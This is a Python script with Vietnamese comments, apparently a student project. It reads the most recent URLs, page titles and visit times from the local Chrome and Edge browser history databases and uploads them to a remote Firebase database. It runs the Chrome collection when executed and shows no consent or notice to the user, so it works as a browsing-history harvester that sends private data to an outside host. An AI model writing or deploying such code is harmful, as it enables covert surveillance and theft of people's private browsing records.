import sqlite3
import os
import time
from datetime import datetime,timedelta
from flask import Flask, request, jsonify, render_template
import sqlite3
from google.cloud import storage
import firebase_admin
from firebase_admin import credentials, storage, db

cred = credentials.Certificate("credentials.json")
firebase_admin.initialize_app(cred, {
        "storageBucket": "pbl4-09092003.appspot.com",
        "databaseURL": "https://pbl4-09092003-default-rtdb.firebaseio.com"
    })
ref = db.reference('history')


def convert_time(timestamp):
    epoch_start = datetime(1601, 1, 1)
    dt_object = epoch_start + timedelta(microseconds=timestamp)
    return dt_object.strftime("%Y-%m-%d %H:%M:%S")

def push_to_firebase(history_data, browser_type):
    # Lấy ngày hiện tại
    current_date = datetime.now().strftime("%Y-%m-%d")
    
    # Tham chiếu đến thư mục theo ngày trong Firebase
    date_ref = ref.child(current_date)

    # Tham chiếu đến thư mục của trình duyệt
    browser_ref = date_ref.child(f"{browser_type}History")
    
    # Đẩy dữ liệu lịch sử duyệt web lên Firebase
    browser_ref.set(history_data)

def get_Edge_history():        
    db_path = os.path.expanduser('~') + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History"

    connection = sqlite3.connect(db_path)
    cursor = connection.cursor()

    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10")
    results = cursor.fetchall()

    browsing_history = []
    for row in results:
        url, title, last_visit_time = row
        formatted_time = convert_time(last_visit_time)
        browsing_history.append({"Time": formatted_time, "title": title, "url": url})
        print(f"{formatted_time}: {title} - {url}")


    cursor.close()
    connection.close()

    # Đẩy dữ liệu lịch sử duyệt web Edge lên Firebase
    push_to_firebase(browsing_history, "Edge")

def get_Chrome_history():        
    db_path = os.path.expanduser('~') + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"

    connection = sqlite3.connect(db_path)
    cursor = connection.cursor()

    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10")
    results = cursor.fetchall()

    browsing_history = []
    for row in results:
        url, title, last_visit_time = row
        formatted_time = convert_time(last_visit_time)
        browsing_history.append({"Time": formatted_time, "title": title, "url": url})
        print(f"{formatted_time}: {title} - {url}")


    cursor.close()
    connection.close()

    # Đẩy dữ liệu lịch sử duyệt web Chrome lên Firebase
    push_to_firebase(browsing_history, "Chrome")

# Gọi hàm để lấy lịch sử duyệt web từ Edge và Chrome và đẩy lên Firebase
# get_Edge_history()
get_Chrome_history()